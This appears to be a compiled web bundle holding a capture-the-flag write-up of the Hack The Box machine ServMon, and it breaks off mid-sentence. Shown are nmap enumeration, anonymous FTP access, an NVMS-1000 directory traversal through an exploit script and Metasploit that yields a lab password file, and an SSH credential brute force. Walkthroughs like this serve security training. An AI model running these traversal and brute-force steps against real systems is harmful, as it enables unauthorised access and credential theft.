"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3343],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>m});var r=n(67294);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,s=function(e,t){if(null==e)return{};var n,r,s={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(s[n]=e[n]);return s}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,s=e.mdxType,o=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=p(n),h=s,m=d["".concat(l,".").concat(h)]||d[h]||u[h]||o;return n?r.createElement(m,a(a({ref:t},c),{},{components:n})):r.createElement(m,a({ref:t},c))}));function m(e,t){var n=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var o=n.length,a=new Array(o);a[0]=h;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[d]="string"==typeof e?e:s,a[1]=i;for(var p=2;p<o;p++)a[p]=n[p];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},55186:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=n(87462),s=(n(67294),n(3905));const o={layout:"post",title:"ServMon ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","smb","pe","exploit","htb","ftp","http"],date:"2020/06/20",thumbnail:"/img/HackTheBox/servmon.png",toc:!0},a=void 0,i={unversionedId:"HackTheBox/ServMon/write-up",id:"HackTheBox/ServMon/write-up",title:"ServMon ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/ServMon/write-up.md",sourceDirName:"HackTheBox/ServMon",slug:"/HackTheBox/ServMon/write-up",permalink:"/writeups/HackTheBox/ServMon/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"smb",permalink:"/writeups/tags/smb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"ftp",permalink:"/writeups/tags/ftp"},{label:"http",permalink:"/writeups/tags/http"}],version:"current",frontMatter:{layout:"post",title:"ServMon ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","smb","pe","exploit","htb","ftp","http"],date:"2020/06/20",thumbnail:"/img/HackTheBox/servmon.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"ScriptKiddie ",permalink:"/writeups/HackTheBox/ScriptKiddie/write-up"},next:{title:"SneakyMailer ",permalink:"/writeups/HackTheBox/SneakyMailer/write-up"}},l={},p=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"Network reconnaissance: FTP",id:"network-reconnaissance-ftp",level:3},{value:"Network reconnaissance: HTTP",id:"network-reconnaissance-http",level:3},{value:"NSClient++",id:"nsclient",level:4},{value:"NVMS-1000",id:"nvms-1000",level:4},{value:"Network reconnaissance: SMB",id:"network-reconnaissance-smb",level:3},{value:"Network reconnaissance: FTP (let&#39;s go back)",id:"network-reconnaissance-ftp-lets-go-back",level:3},{value:"Network reconnaissance: HTTP (let&#39;s go back)",id:"network-reconnaissance-http-lets-go-back",level:3},{value:"Network exploitation: SSH",id:"network-exploitation-ssh",level:3},{value:"Privilege Escalation  through NSClient++: Nadine to NT AuthoritySYSTEM",id:"privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem",level:3}],c={toc:p},d="wrapper";function u(e){let{components:t,...o}=e;return(0,s.kt)(d,(0,r.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,s.kt)("h1",{id:""}),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Name:")," ServMon"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Profile:")," ",(0,s.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/240"},"www.hackthebox.eu")),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,s.kt)("p",null,(0,s.kt)("img",{alt:"servmon",src:n(81709).Z,width:"598",height:"381"})),(0,s.kt)("h1",{id:"-1"}),(0,s.kt)("h3",{id:"overview"},"Overview"),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"TL;DR"),": We have to find some hints in a FTP, finds creds through a Path\nTraversal in NVMS-1000 and gain a low privilege shell, then we pe via\nNSClient++ to get admin RCE."),(0,s.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap   exploitdb smbclient filezilla dos2unix curl metasploit\n")),(0,s.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,s.kt)("p",null,"Let's start with a ",(0,s.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan to find open ports and identify services:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'$ sudo nmap -sSVC -p- 10.10.10.184 -oA nmap_full\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 15:56 CEST\nNmap scan report for 10.10.10.184\nHost is up (0.020s latency).\nNot shown: 65517 closed ports\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_01-18-20  12:05PM       <DIR>          Users\n| ftp-syst:\n|_  SYST: Windows_NT\n22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)\n| ssh-hostkey:\n|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)\n|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)\n|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)\n80/tcp    open  http\n| fingerprint-strings:\n|   GetRequest, HTTPOptions, RTSPRequest:\n|     HTTP/1.1 200 OK\n|     Content-type: text/html\n|     Content-Length: 340\n|     Connection: close\n|     AuthInfo:\n|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n|     <html xmlns="http://www.w3.org/1999/xhtml">\n|     <head>\n|     <title></title>\n|     <script type="text/javascript">\n|     window.location.href = "Pages/login.htm";\n|     <\/script>\n|     </head>\n|     <body>\n|     </body>\n|     </html>\n|   NULL:\n|     HTTP/1.1 408 Request Timeout\n|     Content-type: text/html\n|     Content-Length: 0\n|     Connection: close\n|_    AuthInfo:\n|_http-title: Site doesn\'t have a title (text/html).\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n5040/tcp  open  unknown\n5666/tcp  open  tcpwrapped\n6063/tcp  open  x11?\n6699/tcp  open  napster?\n8443/tcp  open  ssl/https-alt\n| fingerprint-strings:\n|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:\n|     HTTP/1.1 404\n|     Content-Length: 18\n|     Document not found\n|   GetRequest:\n|     HTTP/1.1 302\n|     Content-Length: 0\n|     Location: /index.html\n|     workers\n|     jobs\n|     submitted\n|     errors\n|     threads\n|_    ini"}}]}\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2020-01-14T13:24:20\n|_Not valid after:  2021-01-13T13:24:20\n|_ssl-date: TLS randomness does not represent time\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port80-TCP:V=7.80%I=7%D=6/11%Time=5EE2385B%P=x86_64-unknown-linux-gnu%r\nSF:(NULL,6B,"HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20te\nSF:xt/html\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x2\nSF:0\\r\\n\\r\\n")%r(GetRequest,1B4,"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x\nSF:20text/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthIn\nSF:fo:\\x20\\r\\n\\r\\n\\xef\\xbb\\xbf<!DOCTYPE\\x20html\\x20PUBLIC\\x20\\"-//W3C//DTD\nSF:\\x20XHTML\\x201\\.0\\x20Transitional//EN\\"\\x20\\"http://www\\.w3\\.org/TR/xht\nSF:ml1/DTD/xhtml1-transitional\\.dtd\\">\\r\\n\\r\\n<html\\x20xmlns=\\"http://www\\\nSF:.w3\\.org/1999/xhtml\\">\\r\\n<head>\\r\\n\\x20\\x20\\x20\\x20<title></title>\\r\\n\nSF:\\x20\\x20\\x20\\x20<script\\x20type=\\"text/javascript\\">\\r\\n\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20window\\.location\\.href\\x20=\\x20\\"Pages/login\\.htm\\";\\r\nSF:\\n\\x20\\x20\\x20\\x20<\/script>\\r\\n</head>\\r\\n<body>\\r\\n</body>\\r\\n</html>\\\nSF:r\\n")%r(HTTPOptions,1B4,"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20tex\nSF:t/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x\nSF:20\\r\\n\\r\\n\\xef\\xbb\\xbf<!DOCTYPE\\x20html\\x20PUBLIC\\x20\\"-//W3C//DTD\\x20X\nSF:HTML\\x201\\.0\\x20Transitional//EN\\"\\x20\\"http://www\\.w3\\.org/TR/xhtml1/D\nSF:TD/xhtml1-transitional\\.dtd\\">\\r\\n\\r\\n<html\\x20xmlns=\\"http://www\\.w3\\.\nSF:org/1999/xhtml\\">\\r\\n<head>\\r\\n\\x20\\x20\\x20\\x20<title></title>\\r\\n\\x20\\\nSF:x20\\x20\\x20<script\\x20type=\\"text/javascript\\">\\r\\n\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20window\\.location\\.href\\x20=\\x20\\"Pages/login\\.htm\\";\\r\\n\\x2\nSF:0\\x20\\x20\\x20<\/script>\\r\\n</head>\\r\\n<body>\\r\\n</body>\\r\\n</html>\\r\\n")\nSF:%r(RTSPRequest,1B4,"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/htm\nSF:l\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\\nSF:n\\r\\n\\xef\\xbb\\xbf<!DOCTYPE\\x20html\\x20PUBLIC\\x20\\"-//W3C//DTD\\x20XHTML\\\nSF:x201\\.0\\x20Transitional//EN\\"\\x20\\"http://www\\.w3\\.org/TR/xhtml1/DTD/xh\nSF:tml1-transitional\\.dtd\\">\\r\\n\\r\\n<html\\x20xmlns=\\"http://www\\.w3\\.org/1\nSF:999/xhtml\\">\\r\\n<head>\\r\\n\\x20\\x20\\x20\\x20<title></title>\\r\\n\\x20\\x20\\x\nSF:20\\x20<script\\x20type=\\"text/javascript\\">\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20window\\.location\\.href\\x20=\\x20\\"Pages/login\\.htm\\";\\r\\n\\x20\\x20\nSF:\\x20\\x20<\/script>\\r\\n</head>\\r\\n<body>\\r\\n</body>\\r\\n</html>\\r\\n");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/11%Time=5EE23864%P=x86_64-unknown-lin\nSF:ux-gnu%r(GetRequest,AE,"HTTP/1\\.1\\x20302\\r\\nContent-Length:\\x200\\r\\nLoc\nSF:ation:\\x20/index\\.html\\r\\n\\r\\n\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\\nSF:0\\0\\0\\0\\0\\0\\0\\0\\0\\x12\\x02\\x18\\0\\x1aE\\n\\x07workers\\x12\\x0b\\n\\x04jobs\\x12\nSF:\\x03\\x18\\xc0\\x03\\x12\\x10\\n\\tsubmitted\\x12\\x03\\x18\\xbf\\x03\\x12\\x0c\\n\\x06\nSF:errors\\x12\\x02\\x18\\0\\x12\\r\\n\\x07threads\\x12\\x02\\x18\\x01\\0ini\\"}}\\]}\\0\\0\nSF:\\0")%r(HTTPOptions,36,"HTTP/1\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\\r\\\nSF:nDocument\\x20not\\x20found")%r(FourOhFourRequest,36,"HTTP/1\\.1\\x20404\\r\\\nSF:nContent-Length:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found")%r(RTSPRequest,\nSF:36,"HTTP/1\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\\r\\nDocument\\x20not\\x2\nSF:0found")%r(SIPOptions,36,"HTTP/1\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\nSF:\\r\\nDocument\\x20not\\x20found");\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 4m15s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-06-11T14:04:39\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 235.93 seconds\n')),(0,s.kt)("p",null,"We want to look at FTP (21), Web servers (80 & 8443) and Samba (139,445) first."),(0,s.kt)("h3",{id:"network-reconnaissance-ftp"},"Network reconnaissance: FTP"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://nmap.org/"},"Nmap")," told us it was possible to connect to FTP anonymously but found nothing to\nlist so let's try ourselves:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ ftp 10.10.10.184\nConnected to 10.10.10.184.\n220 Microsoft FTP Service\nName (10.10.10.184:cyfun): Anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> ls -a\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n01-18-20  12:05PM       <DIR>          Users\n226 Transfer complete.\n")),(0,s.kt)("p",null,"But there is nothing (or I thought so)."),(0,s.kt)("h3",{id:"network-reconnaissance-http"},"Network reconnaissance: HTTP"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"port 80: ",(0,s.kt)("strong",{parentName:"li"},"NVMS-1000")," ",(0,s.kt)("a",{parentName:"li",href:"http://10.10.10.184/Pages/login.htm"},"http://10.10.10.184/Pages/login.htm"),(0,s.kt)("img",{parentName:"li",src:"https://i.imgur.com/IyQLwTB.png",alt:"NVMS-1000"})),(0,s.kt)("li",{parentName:"ul"},"port 8443: ",(0,s.kt)("strong",{parentName:"li"},"NSClient++")," ",(0,s.kt)("a",{parentName:"li",href:"https://10.10.10.184:8443/index.html"},"https://10.10.10.184:8443/index.html"),(0,s.kt)("img",{parentName:"li",src:"https://i.imgur.com/qwmxhSs.png",alt:"NSClient++"}))),(0,s.kt)("p",null,"Both services are asking for credentials but we have none yet.\nLet's see if they are vulnerable in a first place."),(0,s.kt)("h4",{id:"nsclient"},"NSClient++"),(0,s.kt)("p",null,"Let's look for a ",(0,s.kt)("inlineCode",{parentName:"p"},"NSClient++")," exploit:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ searchsploit --id NSClient\n--------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                     |  EDB-ID\n--------------------------------------------------------------------------------------------------- ---------------------------------\nNSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                          | 48360\nNSClient++ 0.5.2.35 - Privilege Escalation                                                         | 46802\n--------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n$ searchsploit -p 46802\n  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation\n      URL: https://www.exploit-db.com/exploits/46802\n     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt\nFile Type: ASCII text, with very long lines, with CRLF line terminators\n")),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"Hypothesis:")),(0,s.kt)("p",null,"Once we have a low privileged shell it will be possible to run a command\n(",(0,s.kt)("inlineCode",{parentName:"p"},"nscp web -- password --display"),") or read the config of NSClient++ to retrieve\na user password. Usually NSClient++ run as privileged user so with an app user\nwe could create some tasks that will be run by the app daemon and gain more\nprivileges."),(0,s.kt)("h4",{id:"nvms-1000"},"NVMS-1000"),(0,s.kt)("p",null,"Let's look for a ",(0,s.kt)("inlineCode",{parentName:"p"},"NVMS-1000")," exploit:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ searchsploit --id NVMS 1000\n--------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                     |  EDB-ID\n--------------------------------------------------------------------------------------------------- ---------------------------------\nNVMS 1000 - Directory Traversal                                                                    | 47774\nTVT NVMS 1000 - Directory Traversal                                                                | 48311\n--------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n$ searchsploit -p 47774\n  Exploit: NVMS 1000 - Directory Traversal\n      URL: https://www.exploit-db.com/exploits/47774\n     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt\nFile Type: UTF-8 Unicode text, with CRLF line terminators\n\n$ searchsploit -p 48311\n  Exploit: TVT NVMS 1000 - Directory Traversal\n      URL: https://www.exploit-db.com/exploits/48311\n     Path: /usr/share/exploitdb/exploits/hardware/webapps/48311.py\nFile Type: UTF-8 Unicode text, with CRLF line terminators\n")),(0,s.kt)("p",null,"So let's see if the directory traversal works, I have to use ",(0,s.kt)("inlineCode",{parentName:"p"},"dos2unix")," to\nconvert CRLF to LF (Windows to Linux)."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 -\ndos2unix: active code page: 0\n\nUsage : python exploit.py url filename outputname\nExample : python exploit.py http://10.10.10.10/ windows/win.ini win.ini\n\n$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ windows/win.ini win.ini\ndos2unix: active code page: 0\nHost not vulnerable to Directory Traversal!\n")),(0,s.kt)("p",null,"It failed but maybe because ",(0,s.kt)("inlineCode",{parentName:"p"},"C:\\windows\\win.ini")," doesn't exist. Let's try with\nsomething more reliable like the host file."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Windows/System32/drivers/etc/hosts hosts.txt\ndos2unix: active code page: 0\n\nDirectory Traversal Succeeded\n\nSaving Output\n\n$ cat hosts.txt\n<?xml version="1.0" encoding="UTF-8"?>\n<response>      <status>fail</status>\n        <errorCode>536870934</errorCode>\n</response>\n')),(0,s.kt)("p",null,"It's a false positive occurring when there isn't an file extension.\n(At first glance it's seems the exploit is not working or the server is\nnot vulnerable)."),(0,s.kt)("h3",{id:"network-reconnaissance-smb"},"Network reconnaissance: SMB"),(0,s.kt)("p",null,"From ",(0,s.kt)("a",{parentName:"p",href:"https://nmap.org/"},"Nmap")," script it's it is SMBv2 but we can't list any shares:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ smbclient -L 10.10.10.184 -N\nsession setup failed: NT_STATUS_ACCESS_DENIED\n")),(0,s.kt)("p",null,"As I said in ",(0,s.kt)("a",{parentName:"p",href:"https://blog.raw.pm/en/hackthebox-nest-write-up/#Network-Enumeration-finding-TempUser"},"Nest "),","),(0,s.kt)("blockquote",null,(0,s.kt)("p",{parentName:"blockquote"},"CrackMapExec, smb-enum-shares.nse and enum4linux don't find any shares because they support only SMB v1 that is disabled."),(0,s.kt)("p",{parentName:"blockquote"},"But smbclient and msf modules works. So let's start ",(0,s.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit")," console (msfconsole).")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 10.10.10.184\nRHOSTS => 10.10.10.184\nmsf5 auxiliary(scanner/smb/smb_enumshares) > run\n\n[-] 10.10.10.184:139      - Login Failed: Unable to Negotiate with remote host\n[*] 10.10.10.184:         - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n")),(0,s.kt)("p",null,"MSF can't list shares either. Let's verify it is supporting SMBv2:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 auxiliary(scanner/smb/smb2) > set RHOSTS 10.10.10.184\nRHOSTS => 10.10.10.184\nmsf5 auxiliary(scanner/smb/smb2) > run\n\n[+] 10.10.10.184:445      - 10.10.10.184 supports SMB 2 [dialect 255.2] and has been online for 3676767 hours\n[*] 10.10.10.184:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n")),(0,s.kt)("h3",{id:"network-reconnaissance-ftp-lets-go-back"},"Network reconnaissance: FTP (let's go back)"),(0,s.kt)("p",null,"As we saw earlier with ",(0,s.kt)("inlineCode",{parentName:"p"},"ftp")," CLI we didn't see anything.\nBut I tried again with FileZilla and saw two folders this time, with a file in\neach:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("inlineCode",{parentName:"li"},"Nadine/Confidential.txt")),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("inlineCode",{parentName:"li"},"Nathan/Notes to do.txt"))),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"Confidential.txt")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"Nathan,\n\nI left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.\n\nRegards\n\nNadine\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"Notes to do.txt")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"1) Change the password for NVMS - Complete\n2) Lock down the NSClient Access - Complete\n3) Upload the passwords\n4) Remove public access to NVMS\n5) Place the secret files in SharePoint\n")),(0,s.kt)("h3",{id:"network-reconnaissance-http-lets-go-back"},"Network reconnaissance: HTTP (let's go back)"),(0,s.kt)("p",null,"Let's use ",(0,s.kt)("inlineCode",{parentName:"p"},"NVMS-1000")," path traversal again but this time with:\n",(0,s.kt)("inlineCode",{parentName:"p"},"Users/Nathan/Desktop/Passwords.txt")," thanks to the information we got on the FTP."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Users/Nathan/Desktop/Passwords.txt passwords.txt\ndos2unix: active code page: 0\nHost not vulnerable to Directory Traversal!\n")),(0,s.kt)("p",null,"No file but we are sure it's here. This exploit looks bad so it may be broken."),(0,s.kt)("p",null,"With curl no result either:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ curl 'http://10.10.10.184/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt' --head\nHTTP/1.1 404 Not Found\nContent-type: text/html\nContent-Length: 0\nConnection: close\nAuthInfo:\n")),(0,s.kt)("p",null,"But with ",(0,s.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit")," we get the file (WTF):"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 > search NVMS\n\nMatching Modules\n================\n\n   #  Name                                       Disclosure Date  Rank    Check  Description\n   -  ----                                       ---------------  ----    -----  -----------\n   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal\n\n\nmsf5 > use 0\nmsf5 auxiliary(scanner/http/tvt_nvms_traversal) > options\n\nModule options (auxiliary/scanner/http/tvt_nvms_traversal):\n\n   Name       Current Setting   Required  Description\n   ----       ---------------   --------  -----------\n   DEPTH      13                yes       Depth for Path Traversal\n   FILEPATH   /windows/win.ini  yes       The path to the file to read\n   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      80                yes       The target port (TCP)\n   SSL        false             no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /                 yes       The base URI path of nvms\n   THREADS    1                 yes       The number of concurrent threads (max one per host)\n   VHOST                        no        HTTP server virtual host\n\nmsf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS 10.10.10.184\nRHOSTS => 10.10.10.184\nmsf5 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH /Users/Nathan/Desktop/Passwords.txt\nFILEPATH => /Users/Nathan/Desktop/Passwords.txt\nmsf5 auxiliary(scanner/http/tvt_nvms_traversal) > run\n\n[+] 10.10.10.184:80 - Downloaded 156 bytes\n[+] File saved in: /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf5 auxiliary(scanner/http/tvt_nvms_traversal)\n\n$ cat /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt\n1nsp3ctTh3Way2Mars!\nTh3r34r3To0M4nyTrait0r5!\nB3WithM30r4ga1n5tMe\nL1k3B1gBut7s@W0rk\n0nly7h3y0unGWi11F0l10w\nIfH3s4b0Utg0t0H1sH0me\nGr4etN3w5w17hMySk1Pa5$\n")),(0,s.kt)("h3",{id:"network-exploitation-ssh"},"Network exploitation: SSH"),(0,s.kt)("p",null,"With the looted passwords let's bruteforce SSH for the users nadine and nathan\nby using a ",(0,s.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit")," module."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.10.184\nRHOSTS => 10.10.10.184\nmsf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt\nPASS_FILE => /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt\nmsf5 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt\nUSER_FILE => /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt\nmsf5 auxiliary(scanner/ssh/ssh_login) > run\n\n[+] 10.10.10.184:22 - Success: 'nadine:L1k3B1gBut7s@W0rk' ''id' is not recognized as an internal or external command,  operable program or batch file.  '\n[*] Command shell session 1 opened (10.10.15.26:45331 -> 10.10.10.184:22) at 2020-06-11 18:10:19 +0200\n[-] 10.10.10.184:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with 'set gatherproof off'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n")),(0,s.kt)("p",null,"So a valid set of credentials was 